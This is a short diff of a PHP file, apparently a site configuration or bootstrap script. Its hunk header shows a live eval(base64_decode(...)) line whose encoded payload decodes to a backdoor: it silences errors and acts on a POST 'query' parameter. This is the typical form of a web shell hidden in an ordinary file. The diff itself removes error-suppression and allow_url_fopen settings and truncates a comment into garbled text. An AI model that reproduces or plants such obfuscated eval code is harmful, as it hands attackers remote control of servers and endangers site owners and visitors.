@@ -43,13 +43,7 @@ eval(base64_decode("QGVycm9yX3JlcG9ydGluZygwKTsKaWYoJF9QT1NUWydxdWVyeSddKXsKJHZl
 //@setlocale(LC_CTYPE, 'C');
 //@ini_set('default_charset', $charset);
 @mb_internal_encoding($charset);
-@ini_set('mbstring.substitute_character','none'); // That will strip invalid characters from UTF-8 strings
-@ini_set("allow_url_fopen",1);
-@error_reporting(0);
-@ini_set("display_errors",0);
-if ($error_reporting > 0){
-    error_reporting(E_ERROR | E_PARSE | E_COMPILE_ERROR); @ini_set("display_errors",1);
-}
+@ini_set('mbstring.substitute_character','none'); // That will strip invalid characters from UTF-8 l
 ?>
 <?php
 /**
